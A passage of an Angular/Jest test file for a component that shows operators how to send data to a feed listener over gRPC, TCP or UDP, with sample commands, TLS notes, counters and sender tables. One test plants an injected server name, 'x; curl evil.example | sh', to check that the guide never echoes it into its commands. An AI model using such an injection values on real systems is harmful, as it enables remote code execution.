import { ComponentFixture, TestBed } from '@angular/core/testing';
import { Feed } from '../../shared/models/feed.model';
import { SendGuideComponent } from './send-guide.component';
import { COUNTERS, FRAMING_NOTES, jsonBatchExample, jsonExample } from './send-guide';

function makeFeed(over: { id?: string; driver: string; config: Record<string, unknown>; detail?: Record<string, unknown>; lastError?: string }): Feed {
  return {
    id: over.id ?? 'guide',
    name: 'Guide',
    description: '',
    driver: over.driver,
    source: '',
    builtin: false,
    enabled: true,
    version: 1,
    config: over.config,
    secretRefs: {},
    capabilities: ['listen'],
    createdAt: '2026-10-01T00:00:00Z',
    updatedAt: '2026-10-01T00:00:00Z',
    status: {
      owner: 'listener-0',
      state: 'running',
      health: 'healthy',
      lastError: over.lastError,
      lastMessageAt: null,
      lastSuccessAt: null,
      messagesTotal: 0,
      entitiesLast: 0,
      errorsTotal: 0,
      appliedVersion: 1,
      detail: over.detail ?? {},
      updatedAt: null,
    },
  };
}

/** What a running listener reports about where it listens. */
const listening = (protocol: 'tcp' | 'udp', port: number, extra: Record<string, unknown> = {}) => ({
  listen: { protocol, host: 'sentinel.example', port },
  ...extra,
});

const TIME = /\d\d:\d\d:\d\d/;

describe('SendGuideComponent', () => {
  let fixture: ComponentFixture<SendGuideComponent>;
  let el: HTMLElement;

  beforeEach(async () => {
    await TestBed.configureTestingModule({ imports: [SendGuideComponent] }).compileComponents();
  });

  afterEach(() => {
    jest.useRealTimers();
    delete (navigator as unknown as Record<string, unknown>)['clipboard'];
  });

  /** Renders a guide; more than one can be on the page at once. */
  function render(feed: Feed): HTMLElement {
    fixture = TestBed.createComponent(SendGuideComponent);
    fixture.componentRef.setInput('feed', feed);
    fixture.detectChanges();
    el = fixture.nativeElement as HTMLElement;
    return el;
  }

  const text = (node: Element | null | undefined) => (node?.textContent ?? '').replace(/\s+/g, ' ').trim();
  const blocks = () => Array.from(el.querySelectorAll('pre')).map((pre) => pre.textContent ?? '');
  const status = () => text(el.querySelector('[role=status]'));
  const counterLabels = () => Array.from(el.querySelectorAll('.counters dt')).map(text);
  const headers = () => Array.from(el.querySelectorAll('.senders th')).map(text);
  const rowsOf = () => Array.from(el.querySelectorAll('.senders tbody tr')).map((tr) => Array.from(tr.querySelectorAll('td')));
  const copyButtons = () => Array.from(el.querySelectorAll<HTMLButtonElement>('figure button'));
  /** Lets a click's promise chain finish (the clipboard write is async). */
  const settle = async () => {
    for (let i = 0; i < 8; i++) {
      await Promise.resolve();
    }
    fixture.detectChanges();
  };
  function setClipboard(value: unknown): void {
    Object.defineProperty(navigator, 'clipboard', { value, configurable: true });
  }

  describe('gRPC', () => {
    const grpcFeed = (config: Record<string, unknown> = { port: 6200 }) =>
      makeFeed({ driver: 'grpc', config, detail: { listen: { protocol: 'grpc', host: 'listener.example', port: 6200 } } });

    it('shows the endpoint, the token header, the grpcurl and ew-sensor commands and the protos', () => {
      render(grpcFeed());
      const section = el.querySelector('section.send-guide')!;
      expect(text(section.querySelector('h4'))).toContain('listener.example:6200');
      expect(text(section)).toContain('authorization: Bearer si_…');
      expect(text(section)).toContain('Issue one under Tokens below.');
      expect(blocks()).toEqual([
        'grpcurl -plaintext -import-path proto -proto sentinel/ingest/v1/ingest_service.proto -H "authorization: Bearer $SENTINEL_INGEST_TOKEN" listener.example:6200 sentinel.ingest.v1.IngestService/GetSession',
        'ew-sensor --addr listener.example:6200 --token "$SENTINEL_INGEST_TOKEN" --insecure --config examples/coastal-esm.yaml',
      ]);
      expect(copyButtons()).toHaveLength(2);
      const links = Array.from(el.querySelectorAll<HTMLAnchorElement>('.protos a')).map((a) => a.getAttribute('href'));
      expect(links).toEqual([
        'assets/proto/sentinel/ingest/v1/ingest_service.proto',
        'assets/proto/sentinel/v1/observation.proto',
        'assets/proto/sentinel/v1/common.proto',
        'assets/proto/sentinel/v1/entity.proto',
        'assets/proto/sentinel/v1/platform.proto',
        'assets/proto/sentinel/v1/emplacement.proto',
      ]);
    });

    it('says when TLS and client certificates are on', () => {
      render(grpcFeed({ port: 6200 }));
      expect(text(el.querySelector('.format'))).not.toContain('TLS required');
      render(grpcFeed({ port: 6200, tls: { enabled: true, requireClientCert: true } }));
      expect(text(el.querySelector('.format'))).toContain('TLS required, with a client certificate');
      expect(blocks()[0]).toContain('-cert client.pem -key client-key.pem');
    });

    it('does not render the tcp or udp sections', () => {
      render(grpcFeed());
      expect(el.querySelectorAll('section.send-guide')).toHaveLength(1);
      expect(el.querySelector('details.examples')).toBeNull();
      expect(el.textContent).not.toContain('nc -w1');
      expect(el.textContent).not.toContain('framing');
    });

    it('is not rendered for a tcp listen connection', () => {
      render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000) }));
      expect(el.textContent).not.toContain('authorization: Bearer');
      expect(blocks().some((b) => b.includes('grpcurl') || b.includes('ew-sensor'))).toBe(false);
    });
  });

  it('connect mode: shows the target, the last error, messages and reconnects but no listener counters', () => {
    render(
      makeFeed({
        driver: 'tcp',
        config: { mode: 'connect', host: 'feeds.example', port: 7000, format: 'nmea-ais' },
        lastError: 'dial tcp 10.0.0.9:7000: connection refused',
        detail: {
          connect: { protocol: 'tcp', host: 'feeds.example', port: 7000 },
          messages: 1250,
          reconnects: 3,
          malformed: 0,
          // Counters only a listener raises are not a dialling connection's.
          accepted: 9,
          refused: 1,
          since: '2026-10-18T10:00:00Z',
        },
      }),
    );

    expect(text(el.querySelector('h4'))).toBe('Connects to feeds.example:7000/tcp');
    expect(status()).toContain('Last error: dial tcp 10.0.0.9:7000: connection refused');
    expect(text(el.querySelector('.format'))).toContain('Sentinel connects and reads');
    expect(text(el.querySelector('.format'))).toContain('nmea-ais');
    expect(text(el.querySelector('.since'))).toMatch(/^Connected since \d\d:\d\d:\d\d$/);
    expect(counterLabels()).toEqual(['Undecodable', 'Messages', 'Reconnects']);
    expect(text(el.querySelector('.counters'))).toContain('1,250');
    // Nobody sends to a connection Sentinel dials: no samples, no senders, no allowlist note.
    expect(el.querySelector('figure')).toBeNull();
    expect(el.querySelector('.senders')).toBeNull();
    expect(status()).not.toContain('allowlist');
  });

  it('connect mode: says nothing about a connection time while the connection is down', () => {
    render(makeFeed({ driver: 'tcp', config: { mode: 'connect', host: 'feeds.example', port: 7000 }, detail: { connect: { host: 'feeds.example', port: 7000 }, messages: 0, reconnects: 0 } }));
    expect(el.querySelector('.since')).toBeNull();
  });

  it('notes TLS and mutual TLS, and swaps netcat for openssl', () => {
    const tlsFeed = (tls: Record<string, unknown>) =>
      makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json', tls }, detail: listening('tcp', 6000) });

    render(tlsFeed({ enabled: true }));
    expect(text(el.querySelector('.format'))).toContain('TLS required');
    expect(text(el.querySelector('.format'))).not.toContain('client certificate');
    const test = blocks().find((b) => b.includes('openssl s_client'))!;
    expect(test).toContain('-connect sentinel.example:6000 -servername sentinel.example -verify_hostname sentinel.example -CAfile ca.pem');
    expect(test).not.toContain('-cert');
    expect(blocks().some((b) => /\bnc\b/.test(b))).toBe(false);
    // The command says where ca.pem comes from.
    expect(text(el.querySelector('figcaption'))).toContain('ca.pem');

    render(tlsFeed({ enabled: true, requireClientCert: true }));
    expect(text(el.querySelector('.format'))).toContain('client certificate');
    expect(blocks().find((b) => b.includes('openssl s_client'))).toContain('-CAfile ca.pem -cert client.pem -key client.key');
    expect(text(el.querySelector('figcaption'))).toContain('client.pem');

    // Without TLS it is netcat again.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json' }, detail: listening('tcp', 6000) }));
    expect(blocks().some((b) => b.includes('nc -w1 sentinel.example 6000'))).toBe(true);
    expect(blocks().some((b) => b.includes('openssl'))).toBe(false);
    expect(text(el.querySelector('.format'))).not.toContain('TLS');
  });

  it('names the listener host in every sample, never a stale tls.serverName', () => {
    // A connection switched from connect to listen keeps the setting it used to dial out with.
    const stale = 'x; curl evil.example | sh';

    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json', tls: { enabled: true, serverName: stale } }, detail: listening('tcp', 6000) }));
    expect(el.textContent).not.toContain('curl');
    expect(blocks().find((b) => b.includes('openssl s_client'))).toContain('-connect sentinel.example:6000 -servername sentinel.example');

    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, tls: { enabled: true, serverName: stale } }, detail: listening('tcp', 6000) }));
    expect(el.textContent).not.toContain('curl');
    const examples = el.querySelector('details.examples')!.textContent!;
    expect(examples).toContain('ServerName: "sentinel.example"');
    expect(examples).toContain('server_hostname="sentinel.example"');
  });

  it('shows a JSON sample whether or not a one-line command applies', () => {
    // TLS with a client certificate and no host yet: the command is openssl against a placeholder.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json', tls: { enabled: true } } }));
    expect(blocks()).toContain(jsonExample());
    expect(blocks().find((b) => b.includes('openssl s_client'))).toContain('LISTENER_HOST:6000');

    // JSON in another framing has no one-line command, but its message is still shown.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, encoding: 'json', framing: 'lengthprefix' }, detail: listening('tcp', 6000) }));
    expect(blocks()).toEqual([jsonExample(), jsonBatchExample()]);
    // A line may hold an array of observations, and the format text says so.
    expect(text(el.querySelector('.format'))).toContain('JSON array of up to 100 observations');
    expect(Array.from(el.querySelectorAll('figcaption')).map(text)).toEqual(['Sample message (JSON)', 'Several observations in one message (a JSON array of up to 100)']);
    expect(text(el.querySelector('.format'))).toContain(FRAMING_NOTES['lengthprefix']);

    // Binary protobuf has no text sample.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000) }));
    expect(blocks()).not.toContain(jsonExample());
    expect(blocks()).not.toContain(jsonBatchExample());
    expect(text(el.querySelector('.format'))).not.toContain('JSON array');
  });

  it('describes the framing the connection runs, from the server first', () => {
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000) }));
    expect(text(el.querySelector('.format'))).toContain('format sentinel (binary protobuf)');
    expect(text(el.querySelector('.format'))).toContain(`framing delimited: ${FRAMING_NOTES['delimited']}`);

    // The framing override shows even before the connection runs...
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, framing: 'lengthprefix' } }));
    expect(text(el.querySelector('.format'))).toContain(`framing lengthprefix: ${FRAMING_NOTES['lengthprefix']}`);
    // ...and what the running connection reports wins.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, framing: 'lengthprefix' }, detail: listening('tcp', 6000, { framing: 'line' }) }));
    expect(text(el.querySelector('.format'))).toContain('framing line');

    render(makeFeed({ driver: 'udp', config: { port: 10110, format: 'sentinel' }, detail: listening('udp', 10110) }));
    expect(text(el.querySelector('.format'))).toContain(`UDP, format sentinel (binary protobuf), framing message: ${FRAMING_NOTES['message']}`);
  });

  it('writes Go and Python examples only where they fit, and says why not', () => {
    // Binary protobuf in the framing they write: both examples, collapsed.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000) }));
    const examples = el.querySelector('details.examples')!;
    expect(text(examples.querySelector('summary'))).toBe('Sender examples (Go, Python)');
    expect(examples.querySelectorAll('pre').length).toBe(2);
    expect(examples.textContent).toContain('package main');
    expect(examples.textContent).toContain('sentinel.example:6000');
    expect(examples.textContent).toContain('import socket');
    expect(el.querySelector('.note')).toBeNull();

    // TLS gets TLS-aware programs.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, tls: { enabled: true, requireClientCert: true } }, detail: listening('tcp', 6000) }));
    expect(el.querySelector('details.examples')!.textContent).toContain('tls.Dial');
    expect(el.querySelector('details.examples')!.textContent).toContain('wrap_socket');
    expect(el.querySelector('details.examples')!.textContent).toContain('client.key');

    // A framing the examples do not write: hidden, with the reason.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, framing: 'lengthprefix' }, detail: listening('tcp', 6000) }));
    expect(el.querySelector('details.examples')).toBeNull();
    expect(text(el.querySelector('.note'))).toContain('lengthprefix');

    // JSON: the sample stands in for them.
    render(makeFeed({ driver: 'udp', config: { port: 10110, encoding: 'json' }, detail: listening('udp', 10110) }));
    expect(el.querySelector('details.examples')).toBeNull();
    expect(text(el.querySelector('.note'))).toContain('binary protobuf');
  });

  it('does not warn about an open port with an allowlist', () => {
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'] }, detail: listening('tcp', 6000) }));
    expect(status()).not.toContain('No allowlist');

    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, allow: [] }, detail: listening('tcp', 6000) }));
    expect(status()).toContain('No allowlist: anyone who can reach this port can send.');

    render(makeFeed({ driver: 'udp', config: { port: 10110 }, detail: listening('udp', 10110) }));
    expect(status()).toContain('No allowlist');
  });

  it('device format: no Sentinel samples, but the endpoint, protos and senders', () => {
    render(
      makeFeed({
        driver: 'udp',
        config: { port: 10110, format: 'nmea-gps', decoderOptions: { sourceEntityId: 'truck-1' } },
        detail: listening('udp', 10110, {
          distinctSenders: 1,
          senders: [{ remote: '10.0.0.5', since: '2026-10-18T10:00:00Z', lastAt: '2026-10-18T10:00:05Z', messages: 40, connected: false }],
        }),
      }),
    );

    expect(text(el.querySelector('h4'))).toBe('Send to sentinel.example:10110/udp');
    expect(text(el.querySelector('.format'))).toContain('format nmea-gps');
    expect(el.querySelector('figure')).toBeNull();
    expect(el.querySelector('details.examples')).toBeNull();
    expect(text(el.querySelector('.note'))).toContain('nmea-gps');
    expect(Array.from(el.querySelectorAll('a[download]')).map((a) => a.getAttribute('href'))).toEqual([
      'assets/proto/sentinel/v1/observation.proto',
      'assets/proto/sentinel/v1/common.proto',
      'assets/proto/sentinel/v1/entity.proto',
      'assets/proto/sentinel/v1/platform.proto',
      'assets/proto/sentinel/v1/emplacement.proto',
    ]);
    expect(rowsOf()[0][0].textContent).toContain('10.0.0.5');
  });

  it('shows a bind failure while the listener host is known', () => {
    render(
      makeFeed({
        driver: 'tcp',
        config: { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'] },
        lastError: 'port 6000/tcp is already in use on the listener host',
        detail: listening('tcp', 6000),
      }),
    );
    expect(status()).toBe('Last error: port 6000/tcp is already in use on the listener host');

    // Not running, and nothing said why.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'] } }));
    expect(status()).toBe('Not running on a listener replica yet.');

    // Not running, and the server said why: its words, not a guess.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'] }, lastError: 'no listener replica (run the ingest listener: INGEST_LISTENER=true)' }));
    expect(status()).toBe('Last error: no listener replica (run the ingest listener: INGEST_LISTENER=true)');
  });

  it('words the status by the state of a connection that is not listening', () => {
    const config = { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'] };
    const withState = (state: Feed['status']['state'], enabled = true): Feed => {
      const feed = makeFeed({ driver: 'tcp', config });
      return { ...feed, enabled, status: { ...feed.status, state } };
    };

    render(withState('stopped', false));
    expect(status()).toBe('This connection is disabled.');

    // A disabled connection is disabled whatever state it was last in.
    render(withState('running', false));
    expect(status()).toBe('This connection is disabled.');

    render(withState('stopped'));
    expect(status()).toBe('This connection is stopped.');

    render(withState('error'));
    expect(status()).toBe('This connection is in an error state.');

    render(withState('unassigned'));
    expect(status()).toBe('Not placed on a listener replica yet.');

    render(withState('starting'));
    expect(status()).toBe('Not running on a listener replica yet.');

    // Once the listener says where it listens there is nothing to explain, enabled or not.
    render({ ...withState('running'), status: { ...withState('running').status, detail: listening('tcp', 6000) } });
    expect(status()).toBe('');
  });

  it('keeps its status region in the page when there is nothing to say, so a change is announced', () => {
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'] }, detail: listening('tcp', 6000) }));
    const region = el.querySelector('[role=status]');
    expect(region).not.toBeNull();
    expect(text(region)).toBe('');

    fixture.componentRef.setInput('feed', makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'] }, lastError: 'boom', detail: listening('tcp', 6000) }));
    fixture.detectChanges();
    // The same element, now holding the message.
    expect(el.querySelector('[role=status]')).toBe(region);
    expect(text(region)).toBe('Last error: boom');
  });

  describe('certificate expiry', () => {
    const NOW = '2026-10-18T12:00:00Z';
    const tlsGuide = (detail: Record<string, unknown>) =>
      render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'], tls: { enabled: true } }, detail: listening('tcp', 6000, detail) }));
    const daysFromNow = (days: number) => new Date(Date.parse(NOW) + days * 86_400_000).toISOString().replace('.000Z', 'Z');

    beforeEach(() => {
      jest.useFakeTimers().setSystemTime(new Date(NOW));
    });

    it('warns when the certificate expires within 14 days', () => {
      tlsGuide({ tlsCertNotAfter: '2026-10-25T00:00:00Z' });
      expect(status()).toBe('TLS certificate expires on 2026-10-25 (in 6 days)');
      expect(el.querySelector('[role=status] .warn')).not.toBeNull();

      // Whole days are counted: 13.5 days left is 13, never 14; under a day says so; one day is singular.
      tlsGuide({ tlsCertNotAfter: daysFromNow(0.25) });
      expect(status()).toBe('TLS certificate expires on 2026-10-18 (in less than a day)');
      tlsGuide({ tlsCertNotAfter: daysFromNow(1.5) });
      expect(status()).toContain('(in 1 day)');
      tlsGuide({ tlsCertNotAfter: daysFromNow(13) });
      expect(status()).toContain('(in 13 days)');
      tlsGuide({ tlsCertNotAfter: daysFromNow(13.5) });
      expect(status()).toContain('(in 13 days)');
      // an offset is read as the instant it names, and the date is shown in UTC
      tlsGuide({ tlsCertNotAfter: '2026-10-25T01:00:00+01:00' });
      expect(status()).toBe('TLS certificate expires on 2026-10-25 (in 6 days)');
      tlsGuide({ tlsCertNotAfter: '2026-11-01T14:00:00+01:00' });
      expect(status()).toBe('');

      // The warning arrives in the region that was already on the page.
      tlsGuide({});
      const region = el.querySelector('[role=status]');
      fixture.componentRef.setInput('feed', makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, allow: ['10.0.0.0/8'], tls: { enabled: true } }, detail: listening('tcp', 6000, { tlsCertNotAfter: daysFromNow(3) }) }));
      fixture.detectChanges();
      expect(el.querySelector('[role=status]')).toBe(region);
      expect(text(region)).toContain('TLS certificate expires on');
    });

    it('says when it has expired', () => {
      tlsGuide({ tlsCertNotAfter: '2026-10-10T00:00:00Z' });
      expect(status()).toBe('TLS certificate expired on 2026-10-10');
      expect(el.querySelector('[role=status] .warn')).not.toBeNull();

      // Expiring this very instant is expired.
      tlsGuide({ tlsCertNotAfter: NOW });
      expect(status()).toBe('TLS certificate expired on 2026-10-18');
    });

    it('stays quiet with 30 days left or no certificate', () => {
      tlsGuide({ tlsCertNotAfter: daysFromNow(30) });
      expect(status()).toBe('');
      tlsGuide({ tlsCertNotAfter: daysFromNow(14) });
      expect(status()).toBe('');
      tlsGuide({});
      expect(status()).toBe('');
      // Anything the guide cannot read is no warning, not a broken page.
      for (const bad of ['', 'soon', '1', 'Oct 1 2026', '2026-10-20', '2026-10-20 00:00:00Z', '2026-13-45T99:00:00Z', 20261101, null, { at: 1 }]) {
        tlsGuide({ tlsCertNotAfter: bad });
        expect(status()).toBe('');
      }
      // A dialling connection has no certificate of its own to warn about.
      render(makeFeed({ driver: 'tcp', config: { mode: 'connect', host: 'feeds.example', port: 7000 }, detail: { connect: { host: 'feeds.example', port: 7000 }, tlsCertNotAfter: daysFromNow(1) } }));
      expect(status()).toBe('');
    });

    it('explains the reload counters', () => {
      tlsGuide({ tlsReloads: 2, tlsReloadFailed: 1 });
      expect(counterLabels()).toEqual(['TLS reloads', 'TLS reload failed']);
      expect(Array.from(el.querySelectorAll('.counters dd')).map(text)).toEqual(['2', '1']);
      expect(COUNTERS.find((c) => c.key === 'tlsReloads')!.help).toBe('TLS material reloads that succeeded.');
    });
  });

  it('hides counters that do not apply to UDP and explains the rest', () => {
    render(
      makeFeed({
        driver: 'udp',
        config: { port: 10110 },
        detail: listening('udp', 10110, {
          accepted: 7,
          rejected: 2,
          refused: 0,
          rateLimited: 1,
          senderRateLimited: 4,
          oversize: 0,
          kernelDropped: 9,
          tlsFailed: 0,
          tlsReloadFailed: 0,
          malformed: 3,
        }),
      }),
    );

    // refused, tlsFailed and tlsReloadFailed are TCP's; the OS drops are UDP's.
    expect(counterLabels()).toEqual(['Accepted', 'Not allowed', 'Rate limited', 'Rate limited (per sender)', 'Too large', 'Dropped by the OS', 'Undecodable']);
    expect(Array.from(el.querySelectorAll('.counters dd')).map(text)).toEqual(['7', '2', '1', '4', '0', '9', '3']);

    // Each is explained, in a tooltip and in the glossary.
    const helpOf = (label: string) => COUNTERS.find((c) => c.label === label)!.help;
    const tips = Array.from(el.querySelectorAll('.counters > div')).map((d) => [text(d.querySelector('dt')), d.getAttribute('title')]);
    expect(tips).toEqual(counterLabels().map((label) => [label, helpOf(label)]));
    const glossary = el.querySelector('details.glossary')!;
    expect(text(glossary.querySelector('summary'))).toBeTruthy();
    expect(Array.from(glossary.querySelectorAll('dt')).map(text)).toEqual(counterLabels());
    expect(Array.from(glossary.querySelectorAll('dd')).map(text)).toEqual(counterLabels().map(helpOf));
  });

  it('shows the TCP counters, and a counter the server does not report stays hidden', () => {
    render(
      makeFeed({
        driver: 'tcp',
        config: { mode: 'listen', port: 6000, tls: { enabled: true } },
        detail: listening('tcp', 6000, { accepted: 1200, rejected: 0, refused: 3, rateLimited: 0, oversize: 0, tlsFailed: 5, tlsReloadFailed: 1, malformed: 0 }),
      }),
    );
    expect(counterLabels()).toEqual(['Accepted', 'Not allowed', 'Over connection limit', 'Rate limited', 'Too large', 'TLS failed', 'TLS reload failed', 'Undecodable']);
    expect(text(el.querySelector('.counters'))).toContain('1,200');

    // senderRateLimited, kernelDropped and tlsReloadFailed appear only when the server sends them.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000, tls: { enabled: true } }, detail: listening('tcp', 6000, { accepted: 1 }) }));
    expect(counterLabels()).toEqual(['Accepted']);

    // Nothing reported: no counters block and no glossary.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 } }));
    expect(el.querySelector('.counters')).toBeNull();
    expect(el.querySelector('details.glossary')).toBeNull();
  });

  it('shows how many senders are hidden and a dash for a silent connected sender', () => {
    const senders = [
      { remote: '10.0.0.5:4000', since: '2026-10-18T10:00:00Z', lastAt: '2026-10-18T10:00:05Z', messages: 3, connected: true },
      // Connected, nothing received: Go's zero time...
      { remote: '10.0.0.6:4001', since: '2026-10-18T10:01:00Z', lastAt: '0001-01-01T00:00:00Z', messages: 0, connected: true },
      // ...or, from a newer server, no lastAt at all.
      { remote: '10.0.0.7:4002', since: '2026-10-18T10:02:00Z', messages: 0, connected: true },
    ];
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000, { senders, distinctSenders: 120 }) }));

    expect(text(el.querySelector('.senders caption'))).toBe('Senders in the last 10 minutes (showing 3 of 120)');
    const last = rowsOf().map((cells) => cells[2]);
    expect(text(last[0])).toMatch(TIME);
    for (const silent of [last[1], last[2]]) {
      expect(text(silent)).toBe('—');
      expect(silent.querySelector('[title]')?.getAttribute('title')).toBe('connected, nothing received yet');
    }
    expect(rowsOf().map((cells) => text(cells[0]))).toEqual(['10.0.0.5:4000 (connected)', '10.0.0.6:4001 (connected)', '10.0.0.7:4002 (connected)']);

    // Nothing is hidden when the list is the whole count (or the server gives no count).
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000, { senders, distinctSenders: 3 }) }));
    expect(text(el.querySelector('.senders caption'))).toBe('Senders in the last 10 minutes');
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000, { senders }) }));
    expect(text(el.querySelector('.senders caption'))).toBe('Senders in the last 10 minutes');
  });

  it('skips sender entries it cannot read instead of breaking the page', () => {
    const good = { remote: '10.0.0.5:4000', since: '2026-10-18T10:00:00Z', lastAt: '2026-10-18T10:00:05Z', messages: 3, connected: true };
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000, { senders: [null, 5, 'x', { messages: 1 }, good] }) }));
    expect(rowsOf().map((cells) => text(cells[0]))).toEqual(['10.0.0.5:4000 (connected)']);

    // A senders value that is not a list is no senders.
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000, { senders: 'none' }) }));
    expect(el.querySelector('.senders')).toBeNull();
  });

  it('shows Connected since for TCP senders only', () => {
    const senders = [
      { remote: '10.0.0.5:4000', since: '2026-10-18T10:00:00Z', lastAt: '2026-10-18T10:00:05Z', messages: 3, connected: true },
      { remote: '10.0.0.6:4001', since: '2026-10-18T09:00:00Z', lastAt: '2026-10-18T09:30:00Z', messages: 8, connected: false },
    ];
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000, { senders }) }));
    expect(headers()).toEqual(['Sender', 'Messages', 'Last', 'Connected since']);
    const since = rowsOf().map((cells) => text(cells[3]));
    // Only a sender that is connected has been connected since anything.
    expect(since[0]).toMatch(TIME);
    expect(since[1]).toBe('—');

    // A datagram sender never connects, so its first sighting is not a connection time.
    render(makeFeed({ driver: 'udp', config: { port: 10110 }, detail: listening('udp', 10110, { senders: [{ ...senders[0], connected: false }] }) }));
    expect(headers()).toEqual(['Sender', 'Messages', 'Last']);
  });

  it('renders per-sender diagnostics only when the server sends them', () => {
    const plain = { remote: '10.0.0.5:4000', since: '2026-10-18T10:00:00Z', lastAt: '2026-10-18T10:00:05Z', messages: 3, connected: true };
    const config = { mode: 'listen', port: 6000 };

    // An older server, or nothing undecodable yet: no columns.
    render(makeFeed({ driver: 'tcp', config, detail: listening('tcp', 6000, { senders: [plain] }) }));
    expect(headers()).not.toContain('Undecodable');
    expect(headers()).not.toContain('Last reason');
    render(makeFeed({ driver: 'tcp', config, detail: listening('tcp', 6000, { senders: [{ ...plain, malformed: 0 }] }) }));
    expect(headers()).not.toContain('Undecodable');

    // One sender sent something undecodable: everyone gets the columns.
    const bad = {
      remote: '10.0.0.6:4001',
      since: '2026-10-18T10:01:00Z',
      lastAt: '2026-10-18T10:01:05Z',
      messages: 9,
      connected: true,
      malformed: 3,
      lastReason: 'parse_error',
      lastError: 'proto: cannot parse invalid wire-format data',
      lastMalformedAt: '2026-10-18T10:01:04Z',
      rateLimited: 0,
    };
    render(makeFeed({ driver: 'tcp', config, detail: listening('tcp', 6000, { senders: [plain, bad] }) }));
    expect(headers()).toEqual(['Sender', 'Messages', 'Last', 'Connected since', 'Undecodable', 'Last reason']);
    const [fine, broken] = rowsOf();
    expect(text(fine[4])).toBe('0');
    expect(text(fine[5])).toBe('');
    expect(text(broken[4])).toBe('3');
    expect(text(broken[5])).toBe('parse_error');
    // The error text is the tooltip.
    expect(broken[5].getAttribute('title')).toBe('proto: cannot parse invalid wire-format data');
    expect(fine[5].getAttribute('title')).toBeNull();

    // A reason alone is reason enough.
    render(makeFeed({ driver: 'udp', config: { port: 10110 }, detail: listening('udp', 10110, { senders: [{ ...plain, connected: false, lastReason: 'parse_error' }] }) }));
    expect(headers()).toEqual(['Sender', 'Messages', 'Last', 'Undecodable', 'Last reason']);
    expect(text(rowsOf()[0][3])).toBe('0');
    expect(text(rowsOf()[0][4])).toBe('parse_error');
  });

  it('shows a Rate limited column once any sender was rate limited', () => {
    const sender = (remote: string, rateLimited?: number) => ({ remote, since: '2026-10-18T10:00:00Z', lastAt: '2026-10-18T10:00:05Z', messages: 3, connected: true, ...(rateLimited === undefined ? {} : { rateLimited }) });
    const config = { mode: 'listen', port: 6000 };

    // Older servers send no count, and zero is nothing to show.
    render(makeFeed({ driver: 'tcp', config, detail: listening('tcp', 6000, { senders: [sender('10.0.0.5:4000')] }) }));
    expect(headers()).not.toContain('Rate limited');
    render(makeFeed({ driver: 'tcp', config, detail: listening('tcp', 6000, { senders: [sender('10.0.0.5:4000', 0)] }) }));
    expect(headers()).not.toContain('Rate limited');

    // One sender over its limit gives every row the column.
    render(makeFeed({ driver: 'tcp', config, detail: listening('tcp', 6000, { senders: [sender('10.0.0.5:4000', 0), sender('10.0.0.6:4001', 12_345), sender('10.0.0.7:4002')] }) }));
    expect(headers()).toEqual(['Sender', 'Messages', 'Last', 'Connected since', 'Rate limited']);
    expect(rowsOf().map((cells) => text(cells[4]))).toEqual(['0', '12,345', '0']);

    // Beside the undecodable columns, on UDP too.
    render(makeFeed({ driver: 'udp', config: { port: 10110 }, detail: listening('udp', 10110, { senders: [{ ...sender('10.0.0.5:4000', 2), connected: false, malformed: 1, lastReason: 'parse_error' }] }) }));
    expect(headers()).toEqual(['Sender', 'Messages', 'Last', 'Rate limited', 'Undecodable', 'Last reason']);
    expect(rowsOf().map((cells) => text(cells[3]))).toEqual(['2']);
  });

  it('copies a snippet, falling back to selecting it', async () => {
    const writeText = jest.fn().mockResolvedValue(undefined);
    setClipboard({ writeText });
    render(makeFeed({ driver: 'tcp', config: { mode: 'listen', port: 6000 }, detail: listening('tcp', 6000) }));

    // Both examples have a button; nothing is "Copied" yet.
    expect(copyButtons().map(text)).toEqual(['Copy', 'Copy']);
    const [goPre, pythonPre] = Array.from(el.querySelectorAll('pre'));

    copyButtons()[0].click();
    await settle();
    expect(writeText).toHaveBeenCalledWith(goPre.textContent);
    expect(copyButtons().map(text)).toEqual(['Copied', 'Copy']);

    // Copying another moves the confirmation.
    copyButtons()[1].click();
    await settle();
